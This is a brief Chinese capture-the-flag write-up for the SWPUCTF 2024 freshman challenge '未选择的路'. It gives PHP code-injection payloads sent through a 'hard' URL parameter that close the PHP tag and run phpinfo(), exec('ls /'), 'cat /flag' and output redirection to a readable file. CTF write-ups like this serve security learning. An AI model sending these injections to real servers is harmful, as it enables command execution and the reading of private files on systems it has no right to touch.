## [SWPUCTF 2024 秋季新生赛]未选择的路

![](C:\Users\ASUS\AppData\Roaming\marktext_specialedition\images\2024-11-29-17-43-11-image.png)

?hard=?><?phpinfo()?>就可以了

或者hard=?><?php var_dump(exec("ls /"));?>

hard=?><?php var_dump(exec(“cat /flag”));?>

var_dump可以换成echo

ls /的时候发现只看见了var可以通过以下方式看见根目录的所有内容：

?hard=?><?php var_dump(exec("ls / > a.txt"));?>

http:// node6.anna.nssctf.cn:28063 /a.txt
